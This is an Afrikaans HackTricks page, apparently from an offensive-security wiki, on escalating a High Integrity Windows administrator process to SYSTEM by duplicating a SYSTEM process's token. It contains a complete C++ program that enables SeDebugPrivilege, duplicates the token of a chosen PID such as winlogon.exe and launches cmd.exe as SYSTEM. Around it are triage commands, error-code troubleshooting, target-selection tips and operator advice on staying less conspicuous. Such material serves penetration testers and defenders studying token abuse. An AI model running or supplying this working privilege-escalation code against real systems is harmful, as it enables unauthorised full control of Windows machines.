# SeImpersonate van High na System

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy handel oor die **manual** weergawe van die oorgang van ’n **High Integrity-administrateurproses** na **`NT AUTHORITY\SYSTEM`** deur ’n nie-beskermde SYSTEM-proses oop te maak, sy token te dupliseer en ’n child process met daardie token te skep.

As jy slegs **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** het, maar **nie ’n geskikte SYSTEM-proses kan oopmaak nie**, is die **Potato / named-pipe**-pad gewoonlik meer betroubaar:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

As jy nie net `SYSTEM` wil hê nie, maar ’n **SYSTEM-token met soveel moontlik privileges**, kyk ook na:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Vinnige triage

Voordat jy ’n token probeer steel, valideer vinnig die konteks:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Praktiese notas:

- ’n **High Integrity** admin-token is gewoonlik genoeg om **`SeDebugPrivilege` te aktiveer** en baie nie-beskermde SYSTEM-prosesse oop te maak.
- **`CreateProcessWithTokenW` vereis `SeImpersonatePrivilege`** op die caller. As daardie API met `1314` misluk, skakel oor na `CreateProcessAsUserW` nadat jy reeds ’n SYSTEM primary token gedupliseer het.
- Op moderne Windows is **`lsass.exe` dikwels ’n swak teiken** omdat **LSA protection / PPL** toegang blokkeer, selfs vir administrators met `SeDebugPrivilege`. Verkies **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, of ’n vroeë **`svchost.exe`** wat as SYSTEM loop.
- Nie elke SYSTEM-proses het ’n token wat ewe nuttig is nie. As jy SYSTEM kry maar agterkom dat privileges ontbreek, probeer eerder ’n ander SYSTEM-proses in plaas daarvan om aan te neem dat die tegniek stukkend is.

## Kies die PID noukeurig

Die maklikste manier om dit betroubaar te laat werk, is om **’n SYSTEM-proses te kies waarvan die DACL Administrators werklik toelaat om die proses te query en sy token te dupliseer**.

Goeie kandidate om eerste te toets:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- sommige vroeë `svchost.exe`-instances wat as SYSTEM loop

Vermy by verstek:

- `lsass.exe` op hosts waar **RunAsPPL / LSA protection** geaktiveer is
- beskermde / security-sensitive prosesse wat `Access denied` teruggee, selfs nadat `SeDebugPrivilege` geaktiveer is

Jy kan kandidaatprosesse en hul token/ACLs inspekteer met **Process Explorer** of **Process Hacker** wat elevated loop.

### Kode

Die volgende kode kom uit [this access-token article](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Dit aanvaar ’n **process ID as ’n argument** en begin ’n command shell **as die gebruiker** van daardie proses.<sup>[[3]](#references)</sup>\
Wanneer jy in ’n High Integrity-proses loop, kan jy die **PID van ’n proses wat as System loop aandui** (soos `winlogon`, `wininit`) en ’n `cmd.exe` as SYSTEM uitvoer.<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Nuttige API-/toegangsregte-aantekeninge

Die voorbeeld gebruik `MAXIMUM_ALLOWED`, maar vir werklike bewerkings is dit nuttig om die minimum betrokke dele te onthou:

- `OpenProcessToken()` vereis slegs dat die **process handle** oopgemaak is met **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Om `CreateProcessWithTokenW()` te gebruik, moet die **primary token handle** **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`** hê.<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()` moet ’n **primary token** (`TokenPrimary`) skep, nie slegs ’n impersonation token nie.
- As jy reeds SYSTEM ge-impersonate het en `CreateProcessWithTokenW()` steeds met `1314` misluk, probeer eerder `CreateProcessAsUserW()`.

Dit beteken dat dit gewoonlik onnodig en meer opvallend is om die teikenproses met `PROCESS_ALL_ACCESS` oop te maak, eerder as om net die regte aan te vra wat nodig is om die token te bevraagteken.

## Fout

By sommige geleenthede probeer jy dalk om System te impersonate, maar dit werk nie en wys uitvoer soos die volgende nie:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Dit beteken dat selfs al loop jy op ’n High Integrity-vlak, **jy nie genoeg permissions** oor daardie teikenproses/-token het nie.\
Kom ons kontroleer die huidige Administrator-permissions oor `svchost.exe`-prosesse met **Process Explorer** (of jy kan ook **Process Hacker** gebruik):

1. Kies ’n proses van `svchost.exe`
2. Right Click --> Properties
3. Klik binne die "Security"-oortjie regs onder op die knoppie "Permissions"
4. Klik op "Advanced"
5. Kies "Administrators" en klik op "Edit"
6. Klik op "Show advanced permissions"

![Code - Fout: 6. Klik op "Show advanced permissions"](<../../images/image (437).png>)

Die vorige beeld bevat al die privileges wat "Administrators" oor die gekose proses het (soos jy in die geval van `svchost.exe` kan sien, het hulle slegs "Query"-privileges).

Sien die privileges wat "Administrators" oor `winlogon.exe` het:

![Code - Fout: Sien die privileges wat "Administrators" oor winlogon.exe het](<../../images/image (1102).png>)

Binne daardie proses kan "Administrators" "Read Memory" en "Read Permissions" gebruik, wat Administrators waarskynlik toelaat om die token wat deur hierdie proses gebruik word, te impersonate.

### Algemene oorsake van foute

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: die proses se DACL blokkeer jou, of die teiken is **protected/PPL**. Kies ’n ander SYSTEM-proses.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: jou token-handle is sonder genoeg regte oopgemaak, of die teiken-token se DACL verhinder duplication.
- **`CreateProcessWithTokenW()` -> `1314`**: die caller het nie tans **`SeImpersonatePrivilege`** enabled nie. Probeer dit eers enable, of gebruik `CreateProcessAsUserW()` met die duplicated primary token.
- **`CreateProcessWithTokenW()` -> `1326`** ná vorige mislukkings: dit beteken dikwels bloot dat die vorige token-duplication/impersonation-stap misluk het, en daar dus geen bruikbare primary token is om die child process te launch nie.

## Operator-notas

- Hierdie tegniek is uitstekend wanneer jy reeds **local admin + high integrity** is en net ’n vinnige, handmatige pad na SYSTEM wil hê sonder om ’n service of ’n named-pipe coercion chain op te stel.
- Op geharde Windows 11 / Server-omgewings is **LSA protection toenemend algemeen**, dus is ’n workflow wat aanvaar dat `lsass.exe` altyd leesbaar is, broos. **`winlogon.exe` / `wininit.exe` / `services.exe` is gewoonlik beter eerste keuses**.<sup>[[2]](#references)</sup>
- As jy in ’n **service account**-konteks beland in plaas van ’n verhoogde admin-desktop, is die **Potato family** gewoonlik ’n beter passing as hierdie bladsy.



## References

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: Misbruik van Windows se tokens om Active Directory te kompromitteer sonder om aan LSASS te raak](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [Verstaan en misbruik van proses-tokens — Deel II](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)
{{#include ../../banners/hacktricks-training.md}}
